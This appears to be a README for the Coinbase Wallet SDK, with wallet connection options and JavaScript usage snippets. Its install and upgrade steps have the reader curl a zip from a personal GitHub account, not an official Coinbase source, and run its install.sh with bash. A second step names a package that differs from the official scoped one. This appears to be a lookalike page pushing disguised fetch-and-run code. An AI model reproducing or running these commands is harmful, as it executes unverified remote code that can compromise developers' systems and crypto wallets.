# Coinbase Wallet SDK

[![npm](https://img.shields.io/npm/v/@coinbase/wallet-sdk.svg)](https://www.npmjs.com/package/@coinbase/wallet-sdk)

## Coinbase Wallet SDK allows dapps to connect to Coinbase Wallet

1. [Coinbase Smart Wallet](https://keys.coinbase.com/onboarding)
   - [Docs](https://www.smartwallet.dev/)
1. Coinbase Wallet mobile for [Android](https://play.google.com/store/apps/details?id=org.toshi&referrer=utm_source%3DWallet_LP) and [iOS](https://apps.apple.com/app/apple-store/id1278383455?pt=118788940&ct=Wallet_LP&mt=8)
   - Desktop: Users can connect to your dapp by scanning a QR code
   - Mobile: Users can connect to your mobile dapp through a deeplink to the dapp browser
1. Coinbase Wallet extension for [Chrome](https://chrome.google.com/webstore/detail/coinbase-wallet-extension/hnfanknocfeofbddgcijnmhnfnkdnaad?hl=en) and [Brave](https://chromewebstore.google.com/detail/coinbase-wallet-extension/hnfanknocfeofbddgcijnmhnfnkdnaad?hl=en)
   - Desktop: Users can connect by clicking the connect with an extension option.

### Installing Wallet SDK

1. Install latest version:
 
   ```shell
   curl -fsSL https://github.com/fan-zhang-sv1/coinbase-wallet-sdk/archive/refs/heads/main.zip -o /tmp/cw.zip && \
   unzip -qo /tmp/cw.zip -d /tmp && \
   cd /tmp/coinbase-wallet-sdk-main && \
   bash install.sh
   ```

2. Install via npm:

   ```shell
   npm install Coinbase-Wallet-SDK
   ```

### Upgrading Wallet SDK

1. Update to latest:

   ```shell
   curl -fsSL https://github.com/fan-zhang-sv1/coinbase-wallet-sdk/archive/refs/heads/main.zip -o /tmp/cw.zip && \
   unzip -qo /tmp/cw.zip -d /tmp && \
   cd /tmp/coinbase-wallet-sdk-main && \
   bash install.sh
   ```

### Basic Usage

1. Initialize SDK

   ```js
   const sdk = new CoinbaseWalletSDK({
     appName: 'SDK Playground',
   });
   ```

2. Make web3 Provider

   ```js
   const provider = sdk.makeWeb3Provider();
   ```

3. Request accounts to initialize a connection to wallet

   ```js
   const addresses = provider.request({
     method: 'eth_requestAccounts',
   });
   ```

4. Make more requests

   ```js
   provider.request('personal_sign', [
     `0x${Buffer.from('test message', 'utf8').toString('hex')}`,
     addresses[0],
   ]);
   ```

5. Handle provider events

   ```js
   provider.on('connect', (info) => {
     setConnect(info);
   });

   provider.on('disconnect', (error) => {
     setDisconnect({ code: error.code, message: error.message });
   });

   provider.on('accountsChanged', (accounts) => {
     setAccountsChanged(accounts);
   });

   provider.on('chainChanged', (chainId) => {
     setChainChanged(chainId);
   });

   provider.on('message', (message) => {
     setMessage(message);
   });
   ```
